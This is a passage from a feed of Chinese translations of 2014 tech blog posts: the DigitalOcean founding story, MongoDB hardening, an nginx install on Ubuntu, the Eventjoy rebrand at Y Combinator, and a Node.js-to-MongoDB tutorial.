你可以用PDFKit做很多事情，包括做向量图，多格式文本，图片，注释，等等。
关于API和其他例子的更多信息，可以参考 github。
 
 
By Suroor Wijdan
 
From：http://www.codeproject.com/Tips/755694/Generating-Server-Side-PDFs-using-PDFKit-and-Node
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
DigitalOcean：从被TechStars拒绝走向云托管服务宠儿, goyoo.iteye.com.blog.2047313, Wed, 16 Apr 2014 12:27:12 +0800

 
DigitalOcean的旅程：从被TechStars拒绝走向云托管服务宠儿
 
 
云托管服务商DigitalOcean是发生在去年众多成功创业故事中的一个，在这个月初，DigitalOcean宣布公司又获得了由Andreesen Horowitz领投的3700万美元的新一轮融资，距320万美元种子期投资仅仅几个月。也更重要的是，用户数量在飞快地增长，自从一年前投放市场到现在，云服务器实例已经超过130万。
 
 
然而走到这一步并那么不容易。这周早些时候，我和DigitalOcean的CEO、联合创始人Ben Uretsky有机会坐下来聊了聊公司的这段旅程，发现确实是在很多方面，都是创业公司的典型。Uretsky有托管服务的背景，但在2012年，他决定找到提供云托管服务的一种新方法。当时提供商们的定价策略过于繁杂而且平台有时无法满足用户需求。
 
 
当时亚马逊处于领先地位，但DigitalOcean团队在努力说服潜在投资者：他们可以在托管市场分得一杯羹。在努力获得融资的过程中，DigitalOcean创始人遇到了IA Ventures的Brad Gillespie，他认为公司适合于纽约的TechStars（注：顶级创业孵化器），对于这个建议的唯一问题是：距离申请截止期限还剩大概24小时，于是团队拿出一天时间完成了申请。
 
 
“那是我们第一次真正地将任务落实到纸面上”Uretsky承认道。另外，公司创始人需要为申请的一部分录制一段30秒的视频，鉴于截止日期临近，他们使用了iPhone进行录制。<!--[if !supportLineBreakNewLine]--><!--[endif]-->
 
从那以后，他们的团队接到邀请参加TechStars介绍日，Uretsky后来这样说道，“走的时候感受到一种敬畏”，因为那天的事情使他们意识到像TechStar这样的孵化器可以提供什么样的网络化协助。“那时候我们知道了加入进来很值得，”Uretsky告诉我（而且他在介绍日那天与Brad Feld的见面让他印象格外深刻）。
 
 
与TechStars孵化器的首次介绍之后，他们的团队经历了TechStars的全程筛选。Uretsky特别记得与当时执行NYC计划的David Tisch的一次重要会议。会议一定进行得非常顺利，因为他们受邀进入了最后一轮大概20到25个公司的筛选。尽管让Uretsky相信的东西非常可靠，但DigitalOcean最后被拒绝了，没有进入到TechStars计划里。
 
 
经历了近两个月筛选，那样的结果真得令人失望，当然，“我们为自己的项目争取了”Uretsky告诉我，但没有作用。
 
 
尽管如此，公司继续该产品的工作。在最后一轮入围者宣布的两周之后，Uretsky收到Tisch的email，是邀请他们去申请Boulder项目。Tisch感觉到，在所有被拒绝的公司当中，DigitalOcean是不应该属于那个类别的。“Tisch拒绝我们的主要原因是他自己在服务器的的体验，而基础设施空间没有提供到帮助，”Uretsky告诉我，那样的话被拒绝是情理之中，鉴于Tisch的体验是真正在客户端的。
 
 
2012年5月中旬，公司已经接受Boulder计划并进驻，一个5人的团队搬入到Boulder市一个三居室一周时间。因为只有三间卧室，Uretsky和他的一个创始人伙伴—应该为他保持匿名—最终睡了上下铺。结果他这位伙伴睡觉时打鼾声音非常大，那些天的经历可能并不是很好，Uretsky的描述是“折磨人”！哪怕轻松一点。尽管如此，他依然这样描述孵化期计划：“DigitalOcean伟大的形式时期。”
 
 
排除一切干扰—除了打鼾事件—团队完全专注于产品，就是说，在经历了TechStars筛选时与很多导师见面的第一阶段后。所有导师，对公司有不同的想法，也总有一股转换成其他产品的推动力量，而那些就是团队开始时在做的。有时，他们会有其他想法，包括社区内容网络，配置服务和其他点子。“在结束与所有导师的谈话后，我们仍坚持了自己最初的想法，”Uretsky说道，“我们决定坚持最初的价值定位。”而那些潜在的点子最后成了今天DigitalOcean一些功能的种子。
 
 
那个阶段之后，团队进入构件产品的第二阶段，寻找一些早期用户并获取关注度。在展示日之前，公司提供的云服务器实例已经涨到10000左右，注册用户只有不到400.
 
 
提到展示日，Uretsky回忆道公司的压力是怎样走出孵化器计划，并进行一轮融资，但想获得种子期融资，团队面对的挑战同进入TechStars一样：云托管服务是很难卖的东西。
 
 
尽管如此，最后，团队设法去说服很多投资者来进行早期投资，但为了加快发展，团队决定走一步险棋。尽管DigitalOcean一直以来是一个SSD-only托管平台，但2012年时仍使用常规硬盘驱动器。我们的想法是提供一个简化的用户体验，但SSD提供的并不在最初的规划里。
 
 
尽管如此，为了使自己显示出差异化，DigitalOcean决定转向SSD-only 托管平台，尽管会比常规硬件驱动器贵一些。所以，要维持正常运作需要注册两倍用户。那时，我的同事Romain Dillet记录下了这一步的故事，Uretsky回忆起那篇帖子的日期—2013年1月15日—因为他说在那天他意识到这个想法可行。那天后来，故事震惊了Hacker News，而且从那时起，公司增长了10倍用户。
 
 
去年一年，那个关于DigitalOcean发展的故事都在继续。但对于作为CEO的Uretsky，这种快速发展也意味着它可以离开产品开发，转而专注于融资。
 
 
 
“有一点沮丧，因为我喜欢技术，”他告诉我。“但现在每天大部分工作是开会和打电话。”在一轮很大的融资之后，他现在专注于招聘，有时也不那么容易，因为那往往会决定一个创业公司在未来几年的发展方向。
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
如何安全地配置一个生产环境的MongoDB服务器？, goyoo.iteye.com.blog.2047311, Wed, 16 Apr 2014 12:21:13 +0800

如何安全地配置一个生产环境的MongoDB服务器？
 
 
安全配置一个生产环境的MongoDB服务器
如果MongoDB是一个为你提供选择的文档存储器，那么这篇文章会帮助你，安全妥善地配置一切就绪的生产环境。
 
MongoDB安装指南包括了如何在一个droplet上安装MongoDB。
 
请您阅读安全与认证官方文件。
 
步骤
推荐两个不同的方法，但都可行。第一个是通过一个SSH通道安全地连接到你的数据库。另一个是允许在网上可以访问到你的数据库。两种方法，推荐前者。
 
通过SSH通道连接
通过一个SSH通道连接到你的Mongo虚拟专用服务器，你可以避免很多潜在的安全问题。警告：你的VPS一定要完全锁定，不能对其他端口开放。建议SSH配置为只有秘钥或秘钥加密码。
要建立一个SSH通道，你需要保证：
 
<!--[if !supportLists]-->·         <!--[endif]-->你可以通过SSH进入你的Mongo Droplet
<!--[if !supportLists]-->·         <!--[endif]-->你的Mongo实例绑定到本地主机
 
然后，运行以下命令来初始化连接：
# The \s are just to multiline the command and make it more readable
ssh \
-L 4321:localhost:27017 \
-i ~/.ssh/my_secure_key \
ssh_user@mongo_db_droplet_host_or_ip
 
我们一步一步来看：
<!--[if !supportLists]-->1.    1 <!--[endif]-->SSH通道只需要SSH，你不需要其他特别的程序/二进制文件。
<!--[if !supportLists]-->2.    2 <!--[endif]-->当通过SSH进入MongoDB Droplet时， `-L` 选项会告诉SSH设置一个通道，让当前机器的4321端口传输到27017端口的主机 `localhost`。
<!--[if !supportLists]-->3.     3<!--[endif]--> `-i` 选项只是表示将上面的连接到一个SSH秘钥，而不是一个密码。
<!--[if !supportLists]-->4.    4<!--[endif]--> `ssh_user@mongo_db_droplet_host_or_ip` 是建立一个SSH连接的标准。
 
第二条是真正的精华，决定你怎样告诉你的应用程序或服务器连接到你的MongoDB Droplet。
 
通过互联网连接
如果通过SSH通道连接不是一个必然的选择，你可以通过互联网连接，在这里有一些安全策略需要考虑。
首先是要使用非标准端口。这更多的像是一种模糊处理的技术，意思是默认连接适配器没有用处。
# In your MongoDB configuration file, change the following line to something other than 27017
port = 27017
 
第二，你要把Mongo直接绑定到你的应用程序服务器的IP地址上，这意味着Mongo会只接受连接。
# In your MongoDB configuration file, change the following line to your application server's IP address
bind_ip = 127.0.0.1
 
最后是，可以考虑使用MongoDB的认证功能，并设置一个用户名和密码。要进行这项设置，需将MongoDb shell作为管理员与 `mongo` 命令连接，并添加一个用户。完成时，要确认你是在MongoDB连接字符串上增加新添加的用户名/密码。
 
结论
希望您明白，对于MongoDB安全性来说，以上内容只是一个开始，而非全部或结束。有个关键因素没有提到，是服务器防火墙规则。在他们的安全文档里，可以看到对于MongoDB，10gen防火墙有怎样的建议。
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
如何在Ubuntu 12.04 LTS上安装nginx？, goyoo.iteye.com.blog.2042330, Wed, 09 Apr 2014 10:31:23 +0800

如何在Ubuntu 12.04 LTS上安装nginx？
 
关于nginx
Nginx是一款高性能的网络服务器软件，相对于apache，nginx配置更加灵活，占用内存更小。
 
安装
这套教程里的步骤需要用户具有根特权，你可以在最初版服务器安装教程的第3、4步中查看如何安装。
 
步骤1—安装nginx
打开终端（ terminal），输入：
sudo apt-get install nginx
 
步骤2—启动nginx
nginx不会自行启动，输入下面命令，在你的虚拟专用服务器上运行：
sudo service nginx start
 
步骤3—结果：确认nginx已经启动
你可以确认通过将你的浏览器指向IP地址，nginx已经被作为（你的）网络服务器成功安装。
**你可以运行下面的命令，显示虚拟服务器的IP地址。
ifconfig eth0 | grep inet | awk '{ print $2 }'
 
在浏览器访问你的IP地址时，可以看到“欢迎使用nginx”。
 
在这儿可以看到nginx欢迎页面的屏幕截图。
 
为确保nginx在电脑重启之后自行启动，最好将它添加到启动项。
在终端输入这个命令：
update-rc.d nginx defaults
 
你会看到像这样的一条消息：
System start/stop links for /etc/init.d/nginx already exist.
如果是那样，nginx就设置成了在启动时运行，这样的话一切就绪。
恭喜！您已成功安装nginx。
 
了解更多。
 
在VPS上安装nginx之后，你可以在服务器上做很多事，比如设置虚拟主机或为你的站点创建SSL证书。
 
By Etel Sverdlov
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
两周时间，我们怎样在YC重启公司？, goyoo.iteye.com.blog.2038781, Mon, 31 Mar 2014 12:15:25 +0800

 
两周时间，我们怎样在YC重启公司？
 
大部分公司要想重新塑造品牌，重新设计产品，上线主要新功能，这一过程会花费几个月；而我们在Y Combination（YC）期间，只用了两个星期，下面就是我们如何做到的。
 
前言
我们四周前来到YC，当时我们的名字还是EXMO，主要是为活动组织者创建移动app，网站和微博墙。在同我们的用户，指导顾问还有同行谈过之后，我们决定为活动组织者提供一站式服务，其中包括售票和登记。
 
同时，因为EXMO.com（我们最初的域名是getEXMO.com）这个域名已经负担不起，我们需要给自己改名字。这儿点击可以进入Eventjoy。有了新的品牌，添加了主要功能和重点，我们决定要重新发布。鉴于YC的快节奏，我们要尽最快速度发布新产品，既然是这样，那就意味着两个星期。
 
想出新名字，定义我们的品牌
Zach是我们的一个好朋友，在另一家YC创业公司工作，他帮我们确定了一个以.com结尾的新名字，物美而又价廉。经过数十个小时的研究和大量名字排除，他找到了Eventjoy，这个名字非常热卖，我们一定要拿到它，但.com已经被韩国的一个域名代理所拥有。五分钟不到，我们给这个代理发了邮件，询问价钱，几小时后，得到价钱，讨价还价，最终达成了低价的标准协议。
 
 
考虑到没有域名在手，我们不能注册任何新的品牌，所以我们需要立刻将域名问题搞定。为了完成这一工作，我们愿意支付额外150美元，前提是域名可以在24小时之内归我们所有。最后，在不到一天时间内，我们通过escrow（香港电子库存推出的第三方中介付款服务）进行了支付，并得到指向我们域名服务器的域名。我们也得知，从购买到拿到一个之前拥有的域名如此之快，这是从未听说过的；而一点点奖励的用处如此之大，真让人惊讶。
 
非常酷！此时此刻，我们可以称自己为Eventjoy了，但还没有一个logo。
碰巧Zach是一个设计师，并设计出了现在这个了不起的logo，我认为这是运气。
 <!--[endif]-->
为了将新域名可能带来的法律问题最小化，我们选择了继续使用相同的公司名字（EXMO Inc.），只用Eventjoy作为虚拟名字。说到这儿，有个有意思的段子：我们的总部位于佛罗里达，根据佛罗里达律例第50章（第八条）规定，要想使用虚假名字，我们得在下一期的当地报纸中宣布名字更改问题。没错，就是它说的那样：
 <!--[endif]-->
 
设计Eventjoy体验
我们在得到名字的同时，Eventjoy的一个联合创始人Todd，他开始设计新的网络产品，对我们目前的移动app做必要的更新。
 
网络产品方面，包括定义用户体验，这方面是从空白状态做起的，并要完全明白售票和登记（新功能）是怎么融入到产品。当最初的pixel-perfect（注：火狐浏览器中的一款附加组件，用户可以通过它来设计自己的网站）模板做好后，Todd就转去做18个功能/页面的框架，这些功能和页面是需要执行或使用的。这样，通过把重点放在用户和每个页面如何互动上而不是制作精美的模型，我们就可以更快地前进。
 <!--[endif]-->
 
移动端更简单点儿，对现有的功能只需要新的品牌和一些小的更新。
 
我们想让新品牌有意思并且令人兴奋，所以我们也做出了其他版本（网页版，移动版和email版）来反映我们的用意。
 
开发新的平台
Karl，Eventjoy的技术联合创始人，他的任务是重新编写整个网络产品，更新移动app（iOS和Android），并将EXMO的所有东西转变到Eventjoy，说这个项目是一道大餐一点不为过。
 <!--[endif]-->
 
我们不仅是重新设计一切，还需要去理解售票和登记这样关键的原理机制：包括为组织者和参加者提供完美的商业体验，设计一个系统可以临时预定票；为每一位注册的参加者创建独一无二的入场券；活动期间，办理入场；使活动指标在一个独特的仪表盘上实现可视化。新产品的最后一个主要增加项是对社交元素的很大关注，我们加入了四大主要社交网络，这样参加者可以连接到活动介绍，并在活动中发现、遇见新朋友。
 
有了新名字和新品牌，我们也还要重新设计营销网站和交易邮件。我们只有Karl专注于产品工作，因此任何非关键性的开发都需要避免。Todd用Photoshop设计了新的营销网站，然后将开发工作外包给了一个服务商，让它把设计转化成功能网站。网站的设计和编码只用了不到96个小时。移动端优化的电子邮件模板是从一个主题市场购买的，之后加以调整以匹配我们的品牌。
  <!--[endif]-->
 
要想实现发布的目标，我们需要以一种极其精益的方式来设计，开发和测试。我们同时做了这三样事情：Todd尽快设计了新站点的每一个组件，Karl完成搭建。当每个组件完成后，我们的一个实习生Kevin在单元和系统两个级别上进行测试。所有错误在Asana（注：团队任务管理平台）记录，并鉴别分类，这样就可以首先解决最关键的错误。
 <!--[endif]-->
 
很多其他事情也需要搞定
除了新产品重建和运行的关键工作外，还有无数的事情需要我们去解决。因为大部分相对来说都是非技术性的，就由Todd一一搞定，包括：
 
新的博客—我们想重新做一个博客，但因为没有时间去设置一个Wordpress博客，我们用了Tumblr。和产品外其他区域设计相似，我们购买了一个主题，然后加以修改以匹配我们的品牌。
 <!--[endif]-->
 自我帮助中心—鉴于新的平台有很多功能和添加的商务，在发布之前，我们推出了一个自我帮助中心，添加了大概25篇文章。
 <!--[endif]-->
 
搜索引擎优化—当人们搜素你的产品时，具有关联性非常重要。我们不想失去以前用EXMO时得到的页面关联，最后对所有的页面标题和描述重新整理，并将所有EXMO页面再定向到Eventjoy。
 
分析—我们要确保通过Google分析跟踪到正确的东西，那样我们就知道人们是如何使用这些产品和怎么发现站点的。这需要在发布之前完成执行，否则数据就会丢失。
 
当前用户过度准备
我们在EXMO名下运行了一年多，那段时间我们建立起了一个用户群和很好的声誉，用户都是将来会计划举办活动的人。我们不想孤立我们的用户群或当它们搜索EXMO时被拒绝，所以我们需要一个稳固的过渡计划。Todd最后开发了一个“发布白皮书”（launch playbook），包含一个已经设置好的电子邮件，一个关于发布的博客帖子和更新社交账户的资产情况。电子邮件针对不同部分的用户群， 例如有一部分的目标用户是有档案积分（credits on file）（我们过去的收费方式）的，要将他们过渡到Eventjoy服务费积分。博客帖子集中在我们的过度和计划用Eventjoy做什么。最后，所有的社交账户需要升级，更新名字和资产情况（我们仍在等待Facebook通过我们的请求）。
 
重要的一天
在2月18日周二那天，我们正式在TechCrunch上进行了发布。单单那一周就有将近400%的增长，好过以前最好的一周。从那以后，我们已经得到大量的回馈，并在客户需求基础上考虑我们的下一步优先做什么。
  <!--[endif]-->
 
<!--[endif]-->
 
简明重述
这对于我们来说在体力和脑力方面都付出了巨大的努力，花费了相当大的代价，连续两个星期昼夜不断地工作，每天我们三个人的工作几乎覆盖了24小时。且不说这期间重塑新的公司/产品，我们仍需要为现有的用户提供支持，并积极地寻找新用户以完成每周增长目标。这儿是我们学到的一些东西：
 
早些发布是关键—这很艰难，但是最后我们推迟了很多东西，这些东西本来是要融入到产品以促成发布的成功。最终结果呢？我们更快速地发布，新的用户提供了反馈，这些反馈帮助我们计划下一步。
 
不要害怕非关键项目外包—像我们的博客设计，email模板和营销页面并不像能提供一个牛逼的产品体验那么关键。考虑到时间限制，对于这些非关键项目，我们选择外包或购买模板。
 
一定不能停止交流—我们从一件事跳到另一件，并经常同时做很多工作。对于停工，我们担负不起，所以很关键的是所有我们几个人不断地分享自己正在做什么东西，目前什么状态，下一个要做的是什么。把工作切割成小的单元来做也有帮助。
 
记得休息一会儿—当那么多工作摆在你面前，工作起来很容易停不下来。我们会尽量经常出去走一走，或骑会儿车，呼吸下新鲜空气。
 
 
2014年3月12日  
 
By Todd Goldberg
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
如何在一个VPS上连接Node.js到一个MongoDB数据库？, goyoo.iteye.com.blog.2038773, Mon, 31 Mar 2014 11:55:51 +0800

如何在一个VPS上连接Node.js到一个MongoDB数据库？
 （by Adil Mezghouti）
 
介绍
 
在这篇学习指南里，我们会介绍如何在一个VPS上连接Node.js到一个MongoDB数据库，并做一些基本的数据操作。
 
以下是需要的软件组件：
<!--[if !supportLists]-->·         <!--[endif]-->Ubuntu 12.04 x32 VPS
<!--[if !supportLists]-->·         <!--[endif]-->MongoDB v2.4.6
<!--[if !supportLists]-->·         <!--[endif]-->Node.js v0.10.20
<!--[if !supportLists]-->·         <!--[endif]-->The MongoDB Node.js 驱动器
 
MongoDB
 
“MongoDB是一个面向文档的开源数据库，具有性能高，可用性强并且易扩展的特点。”
 
如果你不熟悉MongoDB或者未安装，请先查看这份指南。
 
先来确定MongoDB进程在运行：
 
ps -ef | grep mongo
输出应该是下面这样的东西：
 
mongodb   1307  1  0 02:27 ?        00:00:01 /usr/bin/mongod --config /etc/mongodb.conf 
如果没有运行，从MongoDB bin目录给出以下命令：
 
mongod
MongoDB有一个控制台客户端，给出下列命令来启动它：
 
mongo
你会看到这样的一个输出（不用理会警告）：
 
MongoDB shell version: 2.4.4
connecting to: test
Server has startup warnings:
Mon Oct  7 20:40:35.209 [initandlisten]
Mon Oct  7 20:40:35.209 [initandlisten] ** WARNING: soft rlimits too low. Number of files is 256, should be at least 1000
>
运行这条命令，列出现存的数据库：
 
show dbs
运行这条命令，显示选中的数据库：
 
db
运行一下命令，切换到“测试”数据库，以显示它包含的集合：
 
use test
show collections 
 
这里有一个命令列表，可以在控制台客户端使用，你可以敲入“help”获得完整的命令列表：
 
show dbs                    #show database names
show collections          #show collections in current database
show users                 # show users in current database
show profile                # show most recent system.profile entries with time >= 1ms
show logs                   # show the accessible logger names
show log [name]          # prints out the last segment of log in memory, 'global' is default
use <db_name>          #  set current database
db.foo.find()                # list objects in collection foo
db.foo.find( { a : 1 } )    #list objects in foo where a == 1
it                                #result of the last line evaluated; use to further iterate
exit                            #quit the mongo shell
 
Node.js
 
“Node.js是一个建立在Chrome的JavaScript运行环境的平台，可以轻松地构建快速，可伸缩性高的网络应用程序。Node.js采用事件驱动，非阻塞I/O模型，这样使其既实现轻量级，又具备高性能，是构建运行在分布式设备的数据密集型实时应用程序的完美选择”。
 
如果你还没有安装，请先查看这篇教程的介绍说明。<!--[if !supportLineBreakNewLine]--><!--[endif]-->
先确认一下Node.js进程在运行：
node -v
作为命令输出，你应该看一下Node.js版本。
 
MongoDB Node.js驱动器
 
这个驱动器是MongoDB官方支持的Node.js驱动器，用纯JavaScript写出来，提供一个本地异步Node.js接口到MongoDB。
 
使用npm来安装驱动器：
npm install mongodb
 
连接到MongoDB，并执行数据操作
 
现在是时候来写可以允许你的Node.js应用程序连接到MongoDB的代码了，有3步操作：从数据库连接，写入，读取。
 
要执行你的代码，我们需要创建一个新文档，取名为：'app.js'.
 
建好文档后，用你的首选编辑器添加下列代码：
 
var MongoClient = require('mongodb').MongoClient
    , format = require('util').format;
MongoClient.connect('mongodb://127.0.0.1:27017/test', function (err, db) {
    if (err) {
        throw err;
    } else {
        console.log("successfully connected to the database");
    }
    db.close();
});
 
输入以下命令，执行app.js文档：
 
node app.js
你应该在输出中看到这样的结果：成功连接到数据库（successfully connected to the database）。
 
现在添加一些语句，向名字为“test_insert”的一个新集合插入东西。
 
var MongoClient = require('mongodb').MongoClient
    , format = require('util').format;
MongoClient.connect('mongodb://127.0.0.1:27017/test', function(err, db) {
    if(err) throw err;
    var collection = db.collection('test_insert');
    collection.insert({a:2}, function(err, docs) {
        collection.count(function(err, count) {
            console.log(format("count = %s", count));
            db.close();
        });
    });
});
 
添加另一些代码块来验证数据已经输入到数据库。
 
var MongoClient = require('mongodb').MongoClient
    , format = require('util').format;
MongoClient.connect('mongodb://127.0.0.1:27017/test', function(err, db) {
    if(err) throw err;
    var collection = db.collection('test_insert');
    collection.insert({a:2}, function(err, docs) {
        collection.count(function(err, count) {
            console.log(format("count = %s", count));
        });
    });
    // Locate all the entries using find
    collection.find().toArray(function(err, results) {
        console.dir(results);
        // Let's close the db
        db.close();
    });
});
 
恭喜啦！现在你可以在一个VPS上，用一个Node.js应用程序从MongoDB数据库连接，插入，读取数据。
 
资源
<!--[if !supportLists]-->·         <!--[endif]-->http://www.nodejs.org/
<!--[if !supportLists]-->·         <!--[endif]-->http://docs.mongodb.org/ecosystem/drivers/node-js/
<!--[if !supportLists]-->·         <!--[endif]-->http://www.mongodb.org/
<!--[if !supportLists]-->·         <!--[endif]-->https://npmjs.org/
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
